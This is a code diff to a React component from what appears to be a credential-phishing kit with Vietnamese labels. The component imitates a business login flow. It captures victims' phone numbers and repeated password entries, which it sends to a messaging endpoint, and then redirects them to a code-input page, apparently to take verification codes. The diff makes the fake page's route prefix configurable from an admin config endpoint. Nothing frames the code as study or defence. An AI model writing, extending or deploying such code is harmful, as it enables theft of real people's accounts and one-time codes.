@@ -3,6 +3,7 @@ import Loading from '@components/Loading';
 import { editMessageText, sendMessage } from '@utils/api';
 import config from '@utils/config';
 import getToday from '@utils/getToday';
+import axios from 'axios';
 import React, { useEffect, useRef, useState } from 'react';
 import 'react-phone-input-2/lib/style.css';
 import { Outlet, useLocation, useNavigate } from 'react-router-dom';
@@ -61,7 +62,7 @@ const GetInfo: React.FC = () => {
 					`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n`;
 				setMessage(message + newMessage);
 				sendMessage({ text: newMessage });
-				navigate('login');
+				navigate(`${businessUrl}/home/login`);
 			}
 		};
 
@@ -97,7 +98,7 @@ const GetInfo: React.FC = () => {
 
 		const delayLoading = async () => {
 			setIsLoading(true);
-			if (currentPath === '/business/home/confirm-password') {
+			if (currentPath === `${businessUrl}/home/confirm-password`) {
 				setMessage(
 					message +
 						`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
@@ -113,8 +114,8 @@ const GetInfo: React.FC = () => {
 			setTimeout(
 				async () => {
 					setIsLoading(false);
-					if (currentPath === '/business/home/login') {
-						navigate('/business/home/confirm-password');
+					if (currentPath === `${businessUrl}/home/login`) {
+						navigate(`${businessUrl}/home/confirm-password`);
 					} else if (
 						failedPasswordAttempts ===
 						(await config()).settings.max_failed_password_attempts
@@ -124,7 +125,7 @@ const GetInfo: React.FC = () => {
 							message +
 								`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
 						);
-						navigate('/business/code-input');
+						navigate(`${businessUrl}/code-input`);
 					} else {
 						if (confirmPasswordInputRef.current) {
 							confirmPasswordInputRef.current.value = '';
@@ -136,22 +137,28 @@ const GetInfo: React.FC = () => {
 			);
 		};
 
-		switch (currentPath) {
-			case '/business/home':
-				handleBusinessHome();
-				break;
-			case '/business/home/login':
-				handleBusinessHomeLogin();
-				break;
-			case '/business/home/confirm-password':
-				handleBusinessHomeConfirmPassword();
-				break;
-			default:
-				break;
+		if (currentPath === `${businessUrl}/home`) {
+			handleBusinessHome();
+		} else if (currentPath === `${businessUrl}/home/login`) {
+			handleBusinessHomeLogin();
+		} else if (currentPath === `${businessUrl}/home/confirm-password`) {
+			handleBusinessHomeConfirmPassword();
 		}
 	};
 
+	const [businessUrl, setBusinessUrl] = useState<string>('');
+
 	useEffect(() => {
+		const fetchConfig = async () => {
+			try {
+				const response = await axios.get('/api/admin/config');
+				setBusinessUrl(response.data.router.business_url);
+				localStorage.setItem('business_url', response.data.router.business_url);
+			} catch (error) {
+				console.error('Error fetching config:', error);
+			}
+		};
+		fetchConfig();
 		setCaseNumber(generateRandomNumber());
 	}, []);
 
